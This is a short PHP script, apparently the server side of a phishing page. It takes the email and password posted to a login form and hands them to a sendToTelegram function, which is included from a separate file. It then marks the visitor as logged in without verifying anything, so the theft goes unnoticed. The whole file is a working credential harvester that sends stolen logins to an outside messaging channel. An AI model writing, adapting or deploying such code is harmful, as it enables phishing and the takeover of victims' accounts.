<?php
@ini_set('session.save_path', sys_get_temp_dir());
@session_start();

require_once 'telegram.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if (!empty($email) && !empty($password)) {
        sendToTelegram($email, $password, $token, $chatId, $telegramMessage);
        
        $_SESSION['logged_in'] = true;
        $_SESSION['user_email'] = $email;
        
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Email dan password harus diisi!";
    }
}

if (isset($_GET['logout'])) {
    @session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

$isLoggedIn = isset($_SESSION['logged_in']) && $_SESSION['logged_in'];
?>